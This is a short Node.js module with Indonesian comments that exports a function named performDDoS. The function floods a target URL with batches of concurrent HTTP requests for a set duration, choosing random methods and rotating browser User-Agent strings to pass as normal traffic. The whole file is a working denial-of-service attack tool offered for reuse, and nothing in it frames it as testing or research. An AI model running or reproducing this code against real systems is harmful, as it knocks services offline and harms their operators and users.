const axios = require('axios');

/**
 * Perform DDoS dengan teknik Batching untuk jutaan request
 * @param {string} targetUrl - URL target
 * @param {number} durationSeconds - Durasi serangan dalam detik
 * @param {number} concurrency - Jumlah request bersamaan per detik (Burst Rate)
 */
async function performDDoS(targetUrl, durationSeconds = 30, concurrency = 1000) {
    console.log(`[DDoS] Mulai serangan besar ke: ${targetUrl}`);
    console.log(`[DDoS] Target: ${concurrency * durationSeconds} request total`);

    let totalSent = 0;
    let totalErrors = 0;
    const startTime = Date.now();
    const endTime = startTime + (durationSeconds * 1000);

    // Loop utama: Jalankan hingga waktu habis
    while (Date.now() < endTime) {
        const batchPromises = [];

        // Buat satu batch request
        for (let i = 0; i < concurrency; i++) {
            totalSent++;

            // Pilih method acak
            const methods = ['GET', 'POST', 'HEAD'];
            const method = methods[Math.floor(Math.random() * methods.length)];

            // Gunakan axios dengan timeout pendek agar tidak numpuk
            const req = axios({
                method: method,
                url: targetUrl,
                timeout: 3000, // 3 detik per request
                headers: {
                    'User-Agent': [
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                        'Mozilla/5.0 (Linux; Android 11)'
                    ][Math.floor(Math.random() * 3)],
                    'Accept': 'text/html, application/json',
                    'Connection': 'keep-alive'
                }
            }).then(() => {
                // Sukses (bisa diabaikan untuk performa)
            }).catch(() => {
                totalErrors++;
            });

            batchPromises.push(req);
        }

        // Tunggu batch ini selesai sebelum kirim batch berikutnya
        // Ini kunci agar memori tidak meledak
        await Promise.all(batchPromises);

        // Jeda sangat singkat antar batch (10ms - 100ms tergantung kekuatan CPU)
        await new Promise(r => setTimeout(r, 50));
    }

    console.log(`[DDoS] Selesai. Total: ${totalSent}, Errors: ${totalErrors}`);
    return { 
        success: true, 
        total: totalSent, 
        errors: totalErrors 
    };
}

module.exports = { performDDoS };
